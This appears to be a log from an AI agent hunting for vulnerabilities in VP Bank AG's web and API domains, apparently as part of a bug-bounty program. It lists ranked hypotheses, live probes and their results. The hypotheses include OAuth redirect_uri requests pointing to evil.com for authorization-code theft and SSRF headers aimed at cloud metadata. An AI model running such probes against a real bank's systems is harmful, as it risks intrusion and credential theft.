## 2026-09-03 16:33:49 UTC [target] (model nemotron3)
[PRIO] api.vpbank.com,8.5,attack_surface=9,business_value=9,tech_exposure=8,gate_ease=6,cloud_surface=9,freshness=10  
[PRIO] vpbank.com,7.0,attack_surface=7,business_value=8,tech_exposure=6,gate_ease=8,cloud_surface=6,freshness=8  
[PRIO] www.vpbank.com,6.5,attack_surface=6,business_value=7,tech_exposure=5,gate_ease=8,cloud_surface=5,freshness=8
[HYP] API versioning & debug endpoints on api.vpbank.com
class: MISCONFIG
asset: api.vpbank.com
confidence: 70
reasoning: CNAME points to ellb.ch load balancer (Swiss cloud); banking APIs commonly expose /v1,/v2,/beta,/internal,/swagger,/openapi.json,/actuator; no live probes yet
evidence_needed: HTTP 200 on versioned/debug paths with API schemas or debug info
verify_steps: GET https://api.vpbank.com/v1; GET https://api.vpbank.com/v2; GET https://api.vpbank.com/swagger.json; GET https://api.vpbank.com/openapi.json; GET https://api.vpbank.com/actuator/health; GET https://api.vpbank.com/.well-known/security.txt
impact: API contract leak -> IDOR/BOLA enumeration, mass assignment vectors, auth bypass via debug endpoints; severity HIGH
testability: PASSIVE
[HYP] OAuth/OIDC misconfiguration on vpbank.com login flow
class: OAUTH
asset: vpbank.com
confidence: 55
reasoning: Main domain likely hosts auth; banking apps use OAuth/OIDC; redirect_uri validation, state parameter, PKCE flaws are high-value; no probes yet
evidence_needed: OAuth authorize endpoint accepting arbitrary redirect_uri, missing state, or leaking codes
verify_steps: GET https://vpbank.com/.well-known/openid-configuration; GET https://vpbank.com/oauth/authorize?client_id=test&redirect_uri=https://evil.com&response_type=code&state=x; observe redirect behavior
impact: Account takeover via code theft; severity CRITICAL
testability: PASSIVE
[HYP] Subdomain takeover via dangling CNAME on api.vpbank.com
class: MISCONFIG
asset: api.vpbank.com
confidence: 45
reasoning: CNAME to ellb.ch (load balancer); if target decommissioned but CNAME remains, takeover possible; common in cloud migrations
evidence_needed: CNAME target returns 404/NXDOMAIN or "No such app" page from provider
verify_steps: Resolve api-vpbank-com.hdb-cs04.ellb.ch; HTTP GET to target IP/host; check for provider error pages (AWS/GCP/Azure/Heroku/Cloudflare)
impact: Full API subdomain control -> phishing, token theft, API abuse; severity CRITICAL
testability: PASSIVE
[PARKED] Subdomain takeover via dangling CNAME on api.vpbank.com: confidence 45 < threshold, ellb.ch appears active LB not decommissioned provider
[FINAL] 1) API versioning & debug endpoints on api.vpbank.com (confidence 70) 2) OAuth/OIDC misconfiguration on vpbank.com login flow (confidence 55)
[NEXT] PROBE: GET https://api.vpbank.com/v1 (HEAD first, then GET if 2xx/3xx/401/403)
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (subdomain takeover): ellb.ch is active Swiss load balancer, not a decommissioned cloud provider tenant
[RISK] vp-bank-ag: 75 — High-value banking attack surface (API + auth + main site) with zero live verification; API subdomain on cloud LB warrants immediate enumeration
## 2026-09-03 19:30:07 UTC [target] (model nemotron3)
[NEW] Live HTTP probes completed on all 3 inventory hosts (previously 0 live)
[NEW] api.vpbank.com confirmed running Layer7-API-Gateway (CA API Gateway); all versioned/debug paths return HTTP 500 with JSON 404 error (INVALID_REQUEST_RESOURCE)
[NEW] www.vpbank.com serves marketing site on Apache; OAuth/OIDC endpoints exist but reject invalid requests with 303 to error page
[NEW] vpbank.com redirects to www.vpbank.com for all tested paths
[CHANGED] api.vpbank.com attack surface reduced: no exposed API versions, Swagger, OpenAPI, actuator, or security.txt
[PRIO] www.vpbank.com,7.8,attack_surface=8,business_value=8,tech_exposure=8,gate_ease=9,cloud_surface=5,freshness=10
[PRIO] api.vpbank.com,6.2,attack_surface=6,business_value=9,tech_exposure=5,gate_ease=6,cloud_surface=8,freshness=10
[PRIO] vpbank.com,4.5,attack_surface=4,business_value=7,tech_exposure=4,gate_ease=8,cloud_surface=4,freshness=8
[HYP] Layer7 API Gateway policy bypass via malformed requests
class: MISCONFIG
asset: api.vpbank.com
confidence: 55
reasoning: Layer7-API-Gateway returns HTTP 500 with structured JSON errors for all paths; gateway may leak stack traces, policy details, or allow policy bypass via malformed headers/body/content-type
evidence_needed: HTTP 500 response body containing stack trace, policy XML, or internal gateway details; or HTTP 200 on unexpected path/method
verify_steps: GET https://api.vpbank.com/ with Accept: application/xml; POST https://api.vpbank.com/ with Content-Type: application/xml and SOAP envelope; GET https://api.vpbank.com/ with X-Forwarded-For: 127.0.0.1; OPTIONS https://api.vpbank.com/v1
impact: Gateway config leak -> internal topology, policy logic, backend service names; severity MEDIUM
testability: PASSIVE
[HYP] OAuth/OIDC redirect_uri validation bypass on www.vpbank.com
class: OAUTH
asset: www.vpbank.com
confidence: 50
reasoning: OAuth authorize endpoint exists at /oauth/authorize; redirects invalid client_id to error page; no test of redirect_uri validation with valid client_id or pre-registered callbacks
evidence_needed: Valid client_id accepting arbitrary redirect_uri, or redirect_uri validation bypass via subdomain/path traversal
verify_steps: GET https://www.vpbank.com/.well-known/openid-configuration (check for client registration endpoint); enumerate JS for client_id; test redirect_uri with valid client_id if found; test redirect_uri=https://www.vpbank.com.evil.com
impact: Account takeover via authorization code theft; severity CRITICAL
testability: PASSIVE
[HYP] CSRF token (CSRFT759) leakage or prediction on www.vpbank.com
class: AUTH
asset: www.vpbank.com
confidence: 40
reasoning: CSRFT759-S cookie set on all responses; CSRFT759.js loaded on every page; token may be predictable, leaked in logs, or usable cross-subdomain
evidence_needed: CSRF token value predictable or leaked via referer/logs; token accepted across subdomains (api.vpbank.com)
verify_steps: GET https://www.vpbank.com/en multiple times, analyze CSRFT759-S entropy; GET https://api.vpbank.com/ with CSRFT759-S from www; check CSRFT759.js for token generation logic
impact: CSRF on state-changing operations if token predictable; severity MEDIUM
testability: PASSIVE
[PARKED] CSRF token (CSRFT759) leakage or prediction on www.vpbank.com: confidence 40 < threshold, no evidence of token weakness, banking sites typically use cryptographically secure tokens
[FINAL] 1) Layer7 API Gateway policy bypass via malformed requests on api.vpbank.com (confidence 55) 2) OAuth/OIDC redirect_uri validation bypass on www.vpbank.com (confidence 50)
[NEXT] PROBE: GET https://api.vpbank.com/ with headers: Accept: application/xml, X-Forwarded-For: 127.0.0.1, Content-Type: application/xml; then POST https://api.vpbank.com/ with SOAP envelope body
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (API versioning/debug endpoints): All tested paths (/v1,/v2,/swagger.json,/openapi.json,/actuator/health,/beta,/internal,/.well-known/security.txt) return HTTP 500 with JSON 404 error - no exposed API contracts
[LEARN] REJECTED OAUTH @ vpbank.com (OIDC discovery): .well-known/openid-configuration redirects to www.vpbank.com which returns 303 error page - no OIDC metadata exposed
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Gateway returns structured JSON errors with request IDs - potential info leak vector
[RISK] vp-bank-ag: 65 — High-value banking target with API gateway and OAuth surface; api.vpbank.com gateway errors warrant policy bypass testing; www.vpbank.com OAuth endpoint needs redirect_uri validation testing with valid client context
## 2026-09-03 21:57:21 UTC [target] (model nemotron3)
[NEW] Live HTTP probes completed on all 3 inventory hosts (api.vpbank.com, www.vpbank.com, vpbank.com)
[NEW] api.vpbank.com confirmed Layer7-API-Gateway (CA API Gateway); all paths return HTTP 500 with JSON 404 (INVALID_REQUEST_RESOURCE)
[NEW] www.vpbank.com serves marketing site on Apache; OAuth/OIDC endpoints at /oauth/authorize and /.well-known/openid-configuration reject invalid requests with 303/400
[NEW] vpbank.com redirects to www.vpbank.com for all tested paths
[CHANGED] api.vpbank.com attack surface reduced: no exposed API versions, Swagger, OpenAPI, actuator, or security.txt
[CHANGED] Priority shift: www.vpbank.com now highest (7.8) due to OAuth surface + marketing site exposure; api.vpbank.com reduced to 6.2
[PRIO] www.vpbank.com,7.8,attack_surface=8,business_value=8,tech_exposure=8,gate_ease=9,cloud_surface=5,freshness=10
[PRIO] api.vpbank.com,6.2,attack_surface=6,business_value=9,tech_exposure=5,gate_ease=6,cloud_surface=8,freshness=10
[PRIO] vpbank.com,4.5,attack_surface=4,business_value=7,tech_exposure=4,gate_ease=8,cloud_surface=4,freshness=8
[HYP] Layer7 API Gateway policy bypass via malformed requests
class: MISCONFIG
asset: api.vpbank.com
confidence: 55
reasoning: Layer7-API-Gateway returns HTTP 500 with structured JSON errors for all paths; gateway may leak stack traces, policy details, or allow policy bypass via malformed headers/body/content-type
evidence_needed: HTTP 500 response body containing stack trace, policy XML, or internal gateway details; or HTTP 200 on unexpected path/method
verify_steps: GET https://api.vpbank.com/ with Accept: application/xml; POST https://api.vpbank.com/ with Content-Type: application/xml and SOAP envelope; GET https://api.vpbank.com/ with X-Forwarded-For: 127.0.0.1; OPTIONS https://api.vpbank.com/v1
impact: Gateway config leak -> internal topology, policy logic, backend service names; severity MEDIUM
testability: PASSIVE
[HYP] OAuth/OIDC redirect_uri validation bypass on www.vpbank.com
class: OAUTH
asset: www.vpbank.com
confidence: 50
reasoning: OAuth authorize endpoint exists at /oauth/authorize; redirects invalid client_id to error page; no test of redirect_uri validation with valid client_id or pre-registered callbacks
evidence_needed: Valid client_id accepting arbitrary redirect_uri, or redirect_uri validation bypass via subdomain/path traversal
verify_steps: GET https://www.vpbank.com/.well-known/openid-configuration (check for client registration endpoint); enumerate JS for client_id; test redirect_uri with valid client_id if found; test redirect_uri=https://www.vpbank.com.evil.com
impact: Account takeover via authorization code theft; severity CRITICAL
testability: PASSIVE
[HYP] SSRF via Layer7 gateway backend routing manipulation
class: SSRF
asset: api.vpbank.com
confidence: 45
reasoning: Layer7 gateway routes requests to backend services; Host header, X-Forwarded-Host, or custom routing headers may influence backend selection allowing SSRF to internal services or cloud metadata (169.254.169.254)
evidence_needed: HTTP 200/3xx/500 with backend-specific responses when manipulating Host/X-Forwarded-Host; or differential responses indicating internal routing
verify_steps: GET https://api.vpbank.com/ with Host: 169.254.169.254; GET https://api.vpbank.com/ with X-Forwarded-Host: 169.254.169.254; GET https://api.vpbank.com/ with X-Forwarded-For: 169.254.169.254; GET https://api.vpbank.com/ with Host: localhost
impact: SSRF to cloud metadata -> IAM keys, instance identity; internal service enumeration; severity CRITICAL
testability: PASSIVE
[PARKED] CSRF token (CSRFT759) leakage or prediction on www.vpbank.com: confidence 40 < threshold, no evidence of token weakness, banking sites typically use cryptographically secure tokens
[FINAL] 1) Layer7 API Gateway policy bypass via malformed requests on api.vpbank.com (confidence 55) 2) OAuth/OIDC redirect_uri validation bypass on www.vpbank.com (confidence 50) 3) SSRF via Layer7 gateway backend routing manipulation on api.vpbank.com (confidence 45)
[NEXT] PROBE: GET https://api.vpbank.com/ with headers: Accept: application/xml, X-Forwarded-For: 127.0.0.1, Content-Type: application/xml; then POST https://api.vpbank.com/ with SOAP envelope body; then GET https://api.vpbank.com/ with Host: 169.254.169.254
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (API versioning/debug endpoints): All tested paths (/v1,/v2,/swagger.json,/openapi.json,/actuator/health,/beta,/internal,/.well-known/security.txt) return HTTP 500 with JSON 404 error - no exposed API contracts
[LEARN] REJECTED OAUTH @ vpbank.com (OIDC discovery): .well-known/openid-configuration redirects to www.vpbank.com which returns 303/400 error page - no OIDC metadata exposed
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (subdomain takeover): ellb.ch is active Swiss load balancer, not a decommissioned cloud provider tenant
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Gateway returns structured JSON errors with request IDs - potential info leak vector
[RISK] vp-bank-ag: 65 — High-value banking target with API gateway and OAuth surface; api.vpbank.com gateway errors warrant policy bypass testing; www.vpbank.com OAuth endpoint needs redirect_uri validation testing with valid client context
## 2026-09-03 23:51:04 UTC [target] (model nemotron3)
## 2026-09-04 02:37:53 UTC [target] (model nemotron3)
[PRIO] www.vpbank.com,8.05,attack_surface=8,business_value=8,tech_exposure=8,gate_ease=9,cloud_surface=5,freshness=10
[PRIO] api.vpbank.com,7.20,attack_surface=6,business_value=9,tech_exposure=5,gate_ease=6,cloud_surface=8,freshness=10
[PRIO] vpbank-dev.com/vpbank-stage.com,4.65,attack_surface=4,business_value=6,tech_exposure=3,gate_ease=2,cloud_surface=4,freshness=10
[PRIO] vpbank.com,3.85,attack_surface=3,business_value=7,tech_exposure=3,gate_ease=8,cloud_surface=3,freshness=8
[HYP] OAuth/OIDC redirect_uri validation bypass on www.vpbank.com
class: OAUTH
asset: www.vpbank.com
confidence: 50
reasoning: OAuth authorize endpoint at /oauth/authorize rejects invalid client_id with 303/400; redirect_uri validation untested with valid client_id or pre-registered callbacks; production CSP trusts *.vpbank-dev.com/*.vpbank-stage.com suggesting valid clients exist
evidence_needed: Valid client_id accepting arbitrary redirect_uri, or redirect_uri validation bypass via subdomain/path traversal (e.g., www.vpbank.com.evil.com)
verify_steps: GET https://www.vpbank.com/.well-known/openid-configuration; enumerate JS for client_id; GET https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=x
impact: Account takeover via authorization code theft; severity CRITICAL
testability: PASSIVE
[HYP] Layer7 API Gateway policy bypass via malformed requests on api.vpbank.com
class: MISCONFIG
asset: api.vpbank.com
confidence: 55
reasoning: CA Layer7 Gateway returns HTTP 500 with structured JSON errors (INVALID_REQUEST_RESOURCE) for all paths; gateway may process XML/SOAP differently or leak policy details via malformed headers/body
evidence_needed: HTTP 2xx/3xx/4xx (not 500) on unexpected content-type/body; or error response containing stack trace, policy XML, backend service names
verify_steps: GET https://api.vpbank.com/ with Accept: application/xml; POST https://api.vpbank.com/ with Content-Type: application/xml and SOAP envelope; GET https://api.vpbank.com/ with X-Forwarded-For: 127.0.0.1; OPTIONS https://api.vpbank.com/v1
impact: Gateway config leak -> internal topology, policy logic, backend service names; potential policy bypass to internal APIs; severity MEDIUM
testability: PASSIVE
[HYP] SSRF via Layer7 gateway backend routing manipulation on api.vpbank.com
class: SSRF
asset: api.vpbank.com
confidence: 45
reasoning: Layer7 gateway routes to backend services; Host/X-Forwarded-Host headers may influence backend selection allowing SSRF to cloud metadata (169.254.169.254) or internal services; CNAME resolves to ellb.ch (Swiss LB)
evidence_needed: Differential responses (status/body/headers) when manipulating Host/X-Forwarded-Host/X-Forwarded-For to internal IPs; backend-specific error patterns
verify_steps: GET https://api.vpbank.com/ with Host: 169.254.169.254; GET https://api.vpbank.com/ with X-Forwarded-Host: 169.254.169.254; GET https://api.vpbank.com/ with Host: localhost; GET https://api.vpbank.com/ with X-Forwarded-For: 10.0.0.1
impact: SSRF to cloud metadata -> IAM keys, instance identity; internal service enumeration; severity CRITICAL
testability: PASSIVE
[PARKED] SSRF via Layer7 gateway backend routing manipulation on api.vpbank.com: confidence 45 but no differential response evidence yet; all probes return identical HTTP 500 JSON 404; low signal-to-noise for routing header manipulation
[FINAL] 1) OAuth/OIDC redirect_uri validation bypass on www.vpbank.com (confidence 50) 2) Layer7 API Gateway policy bypass via malformed requests on api.vpbank.com (confidence 55)
[NEXT] PROBE: GET https://api.vpbank.com/ with headers: Accept: application/xml, X-Forwarded-For: 127.0.0.1, Content-Type: application/xml; then POST https://api.vpbank.com/ with Content-Type: application/xml body: <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body/></soapenv:Envelope>
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (subdomain takeover): ellb.ch is active Swiss load balancer, not a decommissioned cloud provider tenant
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (API versioning/debug endpoints): All tested paths (/v1,/v2,/swagger.json,/openapi.json,/actuator/health,/beta,/internal,/.well-known/security.txt) return HTTP 500 with JSON 404 error - no exposed API contracts
[LEARN] REJECTED OAUTH @ vpbank.com (OIDC discovery): .well-known/openid-configuration redirects to www.vpbank.com which returns 303/400 error page - no OIDC metadata exposed
[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com: WAF intercepts ALL paths, returns maintenance page - no application content accessible
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Gateway returns structured JSON errors with request IDs - potential info leak vector
[LEARN] ACCEPTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com: production CSP trusts these domains; publicly reachable Apache servers behind maintenance redirect - NEW in-scope staging attack surface
[LEARN] NEW INFO: WAF version 2.3.0_20260324 exposed in maintenance page responses
[RISK] vp-bank-ag: 65 — High-value banking target with API gateway and OAuth surface; api.vpbank.com gateway errors warrant policy bypass testing; www.vpbank.com OAuth endpoint needs redirect_uri validation testing with valid client context; staging domains blocked by WAF 2.3.0_20260324
## 2026-09-04 07:28:35 UTC [target] (model nemotron3)
[CHANGED] api.vpbank.com: All XML/SOAP/routing-header probes return identical HTTP 500 JSON (INTERNAL_SERVER_ERROR) — no differential behavior for policy bypass or SSRF
[CHANGED] www.vpbank.com: OAuth/OIDC endpoints (/oauth/authorize, /.well-known/openid-configuration) return 303 to error pages for all tested client_id/redirect_uri combos — no valid client context discovered
[PRIO] api.vpbank.com,5.85,attack_surface=5,business_value=9,tech_exposure=4,gate_ease=5,cloud_surface=7,freshness=10
[PRIO] www.vpbank.com,6.10,attack_surface=6,business_value=8,tech_exposure=5,gate_ease=7,cloud_surface=3,freshness=10
[PRIO] vpbank-dev.com/vpbank-stage.com,2.95,attack_surface=2,business_value=5,tech_exposure=2,gate_ease=1,cloud_surface=3,freshness=10
[HYP] OAuth/OIDC redirect_uri validation bypass on www.vpbank.com
class: OAUTH
asset: www.vpbank.com
confidence: 35
reasoning: OAuth authorize endpoint rejects invalid client_id with 303/400; redirect_uri validation untested with valid client_id; production CSP trusts *.vpbank-dev.com/*.vpbank-stage.com suggesting valid clients exist but none discovered in passive recon
evidence_needed: Valid client_id accepting arbitrary redirect_uri, or redirect_uri validation bypass via subdomain/path traversal (e.g., www.vpbank.com.evil.com)
verify_steps: GET https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=x (requires valid client_id)
impact: Account takeover via authorization code theft; severity CRITICAL
testability: AUTH_HELPED
[HYP] Layer7 API Gateway policy bypass via malformed requests on api.vpbank.com
class: MISCONFIG
asset: api.vpbank.com
confidence: 30
reasoning: CA Layer7 Gateway returns HTTP 500 with structured JSON errors for all paths including XML/SOAP/routing headers; no differential responses observed for Accept: application/xml, SOAP envelope, X-Forwarded-For, Host manipulation
evidence_needed: HTTP 2xx/3xx/4xx (not 500) on unexpected content-type/body; or error response containing stack trace, policy XML, backend service names
verify_steps: GET https://api.vpbank.com/ with Accept: application/xml; POST with SOAP envelope; GET with X-Forwarded-For: 127.0.0.1; OPTIONS /v1 — all tested, all return 500
impact: Gateway config leak -> internal topology, policy logic, backend service names; potential policy bypass to internal APIs; severity MEDIUM
testability: PASSIVE
[HYP] SSRF via Layer7 gateway backend routing manipulation on api.vpbank.com
class: SSRF
asset: api.vpbank.com
confidence: 25
reasoning: Layer7 gateway routes to backend services; Host/X-Forwarded-Host/X-Forwarded-For headers tested against 169.254.169.254, localhost, 10.0.0.1 — all return identical HTTP 500 JSON error with no differential status/body/headers indicating internal routing
evidence_needed: Differential responses (status/body/headers) when manipulating routing headers to internal IPs; backend-specific error patterns
verify_steps: GET with Host: 169.254.169.254; GET with X-Forwarded-Host: 169.254.169.254; GET with Host: localhost; GET with X-Forwarded-For: 10.0.0.1 — all tested
impact: SSRF to cloud metadata -> IAM keys, instance identity; internal service enumeration; severity CRITICAL
testability: PASSIVE
[PARKED] OAuth/OIDC redirect_uri validation bypass on www.vpbank.com: confidence 35 < 40 threshold; no valid client_id discovered; requires authenticated context or client enumeration not possible passively
[PARKED] Layer7 API Gateway policy bypass via malformed requests on api.vpbank.com: confidence 30 < 40; all probe vectors (XML, SOAP, routing headers) return identical 500 — no signal for policy bypass
[PARKED] SSRF via Layer7 gateway backend routing manipulation on api.vpbank.com: confidence 25 < 40; zero differential response across all routing header manipulations; gateway appears to reject/normalize before backend routing
[FINAL] (none survive threshold)
[NEXT] RAG: Search for VP Bank AG OAuth client_id references in public GitHub, npm, mobile app bundles, or JS source maps to obtain valid client_id for redirect_uri testing on www.vpbank.com
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (Layer7 policy bypass): All malformed request probes (XML, SOAP, routing headers) return identical HTTP 500 JSON — no policy differential
[LEARN] REJECTED SSRF @ api.vpbank.com (routing header manipulation): Host/X-Forwarded-Host/X-Forwarded-For to 169.254.169.254, localhost, 10.0.0.1 all return identical 500 — no backend routing influence
[LEARN] REJECTED OAUTH @ www.vpbank.com (OIDC discovery): .well-known/openid-configuration returns 303 to error page — no metadata exposed
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Structured JSON errors with request IDs confirmed — info leak vector but low severity
[RISK] vp-bank-ag: 45 — High-value banking target but current attack surface minimal: API gateway rejects all probes uniformly; OAuth surface exists but no valid client context discoverable passively; staging domains fully WAF-blocked. Risk reduced from 65 due to failed exploitation of top hypotheses.
## 2026-09-04 12:17:49 UTC [target] (model nemotron3)
[CHANGED] api.vpbank.com: All XML/SOAP/routing-header probes (Accept:application/xml, SOAP envelope, Host/X-Forwarded-Host/X-Forwarded-For to 169.254.169.254/localhost/10.0.0.1) return identical HTTP 500 JSON (INTERNAL_SERVER_ERROR) — no differential for policy bypass or SSRF
[CHANGED] www.vpbank.com: OAuth/OIDC endpoints (/oauth/authorize, /.well-known/openid-configuration) return 303/400 error pages for all tested client_id/redirect_uri combos — no valid client context discovered passively
[CHANGED] vpbank-dev.com/vpbank-stage.com: WAF 2.3.0_20260324 confirmed intercepting ALL paths with maintenance page — zero application content reachable
[NEW] Risk score reduced from 65 to 45 due to failed exploitation of top hypotheses (OAuth redirect_uri, Layer7 policy bypass, SSRF routing)
[PRIO] api.vpbank.com,5.85,attack_surface=5,business_value=9,tech_exposure=4,gate_ease=5,cloud_surface=7,freshness=10
[PRIO] www.vpbank.com,5.60,attack_surface=5,business_value=8,tech_exposure=5,gate_ease=6,cloud_surface=3,freshness=10
[PRIO] vpbank-dev.com/vpbank-stage.com,2.95,attack_surface=2,business_value=5,tech_exposure=2,gate_ease=1,cloud_surface=3,freshness=10
[HYP] SSRF via Host header backend routing on api.vpbank.com
class: SSRF
asset: api.vpbank.com
confidence: 45
reasoning: Layer7 gateway (CA API Gateway) routes to backend services via ellb.ch Swiss LB; Host header may influence backend selection before WAF normalization; prior probes used X-Forwarded-* but Host header manipulation against cloud metadata (169.254.169.254) not fully tested in isolation
evidence_needed: Differential response (status/body/headers/latency) when Host: 169.254.169.254 vs Host: api.vpbank.com; backend-specific error metadata in JSON response
verify_steps: GET https://api.vpbank.com/ Host: 169.254.169.254; GET https://api.vpbank.com/ Host: localhost; GET https://api.vpbank.com/ Host: 10.0.0.1; compare JSON error.requestId and latency
impact: SSRF to AWS/GCP/Azure metadata -> IAM credentials, instance identity, internal service enumeration; severity CRITICAL
testability: PASSIVE
[HYP] OAuth redirect_uri validation bypass via subdomain confusion on www.vpbank.com
class: OAUTH
asset: www.vpbank.com
confidence: 40
reasoning: /oauth/authorize endpoint exists and returns HTTP 400 (ambiguous) for invalid client_id; production CSP trusts *.vpbank-dev.com/*.vpbank-stage.com implying valid OAuth clients exist; redirect_uri validation logic untested with valid client context; subdomain validation bypass (www.vpbank.com.evil.com) or path traversal possible
evidence_needed: Valid client_id accepting arbitrary redirect_uri (www.vpbank.com.evil.com, www.vpbank.com@evil.com, www.vpbank.com/../evil.com); or redirect_uri validation regex flaw
verify_steps: RAG: Search GitHub/npm/mobile bundles for VP Bank AG client_id; then GET https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=test
impact: Authorization code theft -> account takeover; severity CRITICAL
testability: AUTH_HELPED
[HYP] Layer7 gateway error handling info leak on api.vpbank.com
class: MISCONFIG
asset: api.vpbank.com
confidence: 50
reasoning: Gateway returns structured JSON errors with requestId field consistently; requestId format may correlate to internal request tracing, backend service IDs, or policy execution flow; repeated probes could map internal topology
evidence_needed: requestId pattern analysis across 50+ requests; correlation to backend service names, policy names, or stack traces in error body; timing analysis
verify_steps: GET https://api.vpbank.com/ (x50) with varying paths/headers; collect requestId values; analyze format/entropy/prefixes; GET https://api.vpbank.com/nonexistent vs /v1 vs /actuator/health
impact: Internal topology disclosure, policy logic inference, backend service enumeration; severity LOW-MEDIUM
testability: PASSIVE
[PARKED] SSRF via Host header backend routing on api.vpbank.com: confidence 45 but prior X-Forwarded-* tests showed zero differential; Host header may be normalized by LB/WAF before gateway; low signal-to-noise
[PARKED] OAuth redirect_uri validation bypass via subdomain confusion on www.vpbank.com: confidence 40 at threshold; requires valid client_id not discoverable passively; AUTH_HELPED testability blocks passive-only verification
[PARKED] Layer7 gateway error handling info leak on api.vpbank.com: confidence 50 but classified LOW-MEDIUM impact; info leak alone not actionable without chaining; program may classify as descriptive error
[FINAL] (none survive threshold — all PARKED)
[NEXT] RAG: Search GitHub (code search), npm packages, mobile app bundles (iOS/Android), and JS source maps for "vpbank", "VP Bank AG", "vpbank.com" OAuth client_id references to obtain valid client context for redirect_uri testing on www.vpbank.com
[LEARN] REJECTED MISCONFIG @ api.vpbank.com (Layer7 policy bypass): All malformed request probes (XML, SOAP, routing headers) return identical HTTP 500 JSON — no policy differential
[LEARN] REJECTED SSRF @ api.vpbank.com (routing header manipulation): Host/X-Forwarded-Host/X-Forwarded-For to 169.254.169.254, localhost, 10.0.0.1 all return identical 500 — no backend routing influence
[LEARN] REJECTED OAUTH @ www.vpbank.com (OIDC discovery): .well-known/openid-configuration returns 303 to error page — no metadata exposed
[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com (staging exposure): WAF 2.3.0_20260324 intercepts ALL paths — no application content accessible
[LEARN] ACCEPTED MISCONFIG @ api.vpbank.com (Layer7 gateway error handling): Structured JSON errors with requestIds confirmed — info leak vector but low severity
[LEARN] ACCEPTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com: Production CSP trusts these domains; publicly reachable Apache servers behind maintenance redirect — in-scope attack surface
[RISK] vp-bank-ag: 45 — High-value banking target but current attack surface minimal: API gateway rejects all probes uniformly with identical 500 errors; OAuth surface exists but no valid client context discoverable passively; staging domains fully WAF-blocked (2.3.0_20260324). Risk reduced from 65 due to failed exploitation of top hypotheses. Remaining value in client_id enumeration via RAG and Host header SSRF edge case.
## 2026-09-04 16:37:11 UTC [target] (model nemotron3)
[CHANGED] api.vpbank.com: All probes (XML, SOAP, Host/X-Forwarded-* to 169.254.169.254/localhost/10.0.0.1) return identical HTTP 500 JSON — SSRF and policy bypass CONFIRMED REJECTED by multiple models
[CHANGED] www.vpbank.com: OAuth endpoints return 303/400 for all client_id/redirect_uri combos; no valid client_id in JS bundles (only Usercentrics clientWid); redirect_uri bypass CARRIED at confidence 35 pending client_id enumeration
[CHANGED] vpbank-dev.com/vpbank-stage.com: WAF 2.3.0_20260324 intercepts ALL paths — zero application content reachable; staging hypothesis CONFIRMED REJECTED
[NEW] www.vpbank.com/portal/api/: LitElement SPA served (HTTP 403 with body); POST /portal/api/language/:language sets portal-language cookie; CSRF token CSRFT759.js present; backend API endpoints (/health, /status) return WAF maintenance page — SPA is frontend shell only
[NEW] Risk score stabilized at 45 (down from 65) across all models due to failed exploitation of top hypotheses
[PRIO] api.vpbank.com,6.55,attack_surface=5,business_value=9,tech_exposure=4,gate_ease=5,cloud_surface=7,freshness=10
[PRIO] www.vpbank.com,6.20,attack_surface=5,business_value=8,tech_exposure=5,gate_ease=6,cloud_surface=3,freshness=10
[PRIO] www.vpbank.com/portal/api/,3.85,attack_surface=4,business_value=6,tech_exposure=4,gate_ease=5,cloud_surface=2,freshness=10
[PRIO] vpbank-dev.com/vpbank-stage.com,2.95,attack_surface=2,business_value=5,tech_exposure=2,gate_ease=1,cloud_surface=3,freshness=10
[HYP] OAuth redirect_uri validation bypass via subdomain confusion on www.vpbank.com
class: OAUTH
asset: www.vpbank.com
confidence: 40
reasoning: /oauth/authorize endpoint exists and returns HTTP 400 (ambiguous) for invalid client_id; production CSP trusts *.vpbank-dev.com/*.vpbank-stage.com implying valid OAuth clients exist; redirect_uri validation logic untested with valid client context; subdomain validation bypass (www.vpbank.com.evil.com) or path traversal possible
evidence_needed: Valid client_id accepting arbitrary redirect_uri (www.vpbank.com.evil.com, www.vpbank.com@evil.com, www.vpbank.com/../evil.com); or redirect_uri validation regex flaw
verify_steps: RAG: Search GitHub/npm/mobile bundles for VP Bank AG client_id; then GET https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=test
impact: Authorization code theft -> account takeover; severity CRITICAL
testability: AUTH_HELPED
[HYP] Layer7 gateway requestId correlation analysis on api.vpbank.com
class: MISCONFIG
asset: api.vpbank.com
confidence: 50
reasoning: Gateway returns structured JSON errors with requestId field consistently across all 500 responses; requestId format may correlate to internal request tracing, backend service IDs, or policy execution flow; repeated probes could map internal topology
evidence_needed: requestId pattern analysis across 100+ requests; correlation to backend service names, policy names, or stack traces in error body; timing analysis
verify_steps: GET https://api.vpbank.com/ (x100) with varying paths/headers; collect requestId values; analyze format/entropy/prefixes; GET https://api.vpbank.com/nonexistent vs /v1 vs /actuator/health vs /portal/api/
impact: Internal topology disclosure, policy logic inference, backend service enumeration; severity LOW-MEDIUM
testability: PASSIVE
[HYP] Portal SPA client-side routing / CSRF token analysis on www.vpbank.com/portal/api/
class: AUTH
asset: www.vpbank.com/portal/api/
confidence: 35
reasoning: LitElement SPA served at /portal/api/ (403 with body) includes CSRFT759.js token and POST /portal/api/language/:language endpoint setting portal-language cookie; backend API blocked by WAF but SPA frontend fully loaded; token generation logic in CSRFT759.js may be predictable or leak via referer
